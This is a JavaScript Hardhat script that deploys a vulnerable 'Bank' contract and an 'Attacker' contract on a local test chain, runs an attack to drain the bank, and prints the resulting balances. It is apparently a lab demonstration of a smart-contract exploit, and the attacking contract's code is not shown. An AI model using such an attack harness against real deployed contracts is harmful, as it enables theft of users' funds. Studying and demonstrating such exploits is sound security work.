import { ethers } from "ethers";
import hre from "hardhat";

async function main() {
    const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

    const deployer = await provider.getSigner(0);
    const user = await provider.getSigner(1);

    console.log("Deploying with:", await deployer.getAddress());

    const BankArtifact = await hre.artifacts.readArtifact("Bank");
    const BankFactory = new ethers.ContractFactory(
        BankArtifact.abi,
        BankArtifact.bytecode,
        deployer
    );

    const bank = await BankFactory.deploy();
    await bank.waitForDeployment();

    const bankAddress = await bank.getAddress();
    console.log("Bank deployed to:", bankAddress);

    await bank.connect(user).deposit({
        value: ethers.parseEther("10"),
    });

    console.log("Bank funded with 10 ETH");

    const AttackerArtifact = await hre.artifacts.readArtifact("Attacker");
    const AttackerFactory = new ethers.ContractFactory(
        AttackerArtifact.abi,
        AttackerArtifact.bytecode,
        deployer
    );

    const attacker = await AttackerFactory.deploy(bankAddress);
    await attacker.waitForDeployment();

    const attackerAddress = await attacker.getAddress();
    console.log("Attacker deployed to:", attackerAddress);



    const tx = await attacker.connect(deployer).attack({
        value: ethers.parseEther("1"),
        gasLimit: 3000000
    });
    await tx.wait();

    console.log("Attack executed");

    const bankBalance = await provider.getBalance(bankAddress);
    const attackerBalance = await provider.getBalance(attackerAddress);

    console.log("Bank balance:", ethers.formatEther(bankBalance));
    console.log("Attacker balance:", ethers.formatEther(attackerBalance));
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});